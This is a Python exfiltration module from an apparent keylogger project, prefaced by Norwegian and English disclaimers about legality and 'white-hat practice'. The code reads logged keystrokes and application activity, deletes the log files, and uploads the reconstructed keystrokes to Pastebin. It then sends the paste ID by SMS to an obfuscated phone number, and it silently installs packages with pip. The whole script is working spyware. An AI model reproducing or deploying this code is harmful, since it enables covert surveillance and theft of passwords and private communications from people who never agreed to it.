"""
Denne programvare er i strid med straffeloven paragraf 205,
retten til privat kommunikasjon.

Bare bruk denne programvaren om du har fått skriftlig tillatelse
fra vedkommende du kommer til å bruke den på! :)
"""

"""
I assume this to be illegal in most countries.
This project is for learning and white-hat practice.
Know your country's laws before using this on others
and have clear agreements with the others before
using this on them. :)
"""

import os, re, requests, pip, auth
try:
    import clockwork
except ImportError:
    pip.main(['install', "pastebin"])
    pip.main(['install', "clockwork"])
    import pastebin
    import clockwork

if os.path.exists("key_log.txt"):
    with open("key_log.txt", "r") as f:
        content = f.readlines()
    os.remove("key_log.txt")
else:
    content = None
    parsed_log = ''

if content:
    keystrokes = [line.split(":", 3)[-1].strip("\n '") for line in content]
    keystrokes = ''.join(keystrokes)
    keystrokes = keystrokes.replace("Key.shift", '')
    keystrokes = keystrokes.replace("Key.ctrl_l", '')
    keystrokes = keystrokes.replace("Key.space", ' ')
    keystrokes = keystrokes.replace("Key.backspace", '<-')
    parsed_log = '\n\t'.join(re.split('Key.tab|Key.enter', keystrokes))


if os.path.exists("app_log.txt"):
    with open("app_log.txt", "r") as f:
        app_log = f.read()
    os.remove("app_log.txt")
else:
    app_log = ""

paste_content = parsed_log + '\n\n' + app_log
url = r"http://pastebin.com/api/api_post.php"

r = requests.post(url, data = {
                                "api_dev_key":auth.pastebin_SuperDuperKali,
                                "api_option":"paste",
                                "api_paste_code":paste_content,
                                "api_paste_name":"SuperDuperKali"
                              }
                 )



new_paste_url = r.text
to  ='19236491276349817263498172634987612341' #obfuscating your phone number. Current algorithm: 
to  = [i for i in to[::int("1010", 2)]]       #one real digit followed by 9 fake ones until your number is written. 
to = ''.join(to)                              #Feel free to change it




content = new_paste_url
api = clockwork.API(auth.clockwork)
message = clockwork.SMS(
    to=to,
    message=new_paste_url.split('/')[-1]
)

response = api.send(message)

with open("app_log.txt", "a") as f:
    if response.success:
        f.write(response.id)
    else:
        f.write(response.error_code)
        f.write(response.error_message)
